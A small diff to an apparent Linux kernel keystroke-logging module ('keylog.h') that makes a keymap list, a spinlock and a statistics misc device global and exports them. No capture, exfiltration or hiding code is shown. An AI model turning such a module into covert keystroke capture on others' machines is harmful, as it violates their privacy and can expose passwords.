@@ -1,5 +1,9 @@
 #include "keylog.h"
 
+extern struct s_keyboard_map keyboard_mapping[];
+LIST_HEAD(head_keymap_lst);
+DEFINE_SPINLOCK(mr_lock);
+
 int cmp_pressed(void *priv, struct list_head *a, struct list_head *b)
 {
 	struct s_keyboard_map_lst		*a_stroke = NULL;
@@ -115,9 +119,11 @@ static struct file_operations const stats_file_fops = {
 	.llseek =	seq_lseek,
 };
 
-static struct miscdevice		stats_dev = {
+struct miscdevice		stats_dev = {
 	MISC_DYNAMIC_MINOR,
 	MODULE_STATS_NAME,
 	&stats_file_fops
 };
 
+EXPORT_SYMBOL(head_keymap_lst);
+EXPORT_SYMBOL(stats_dev);
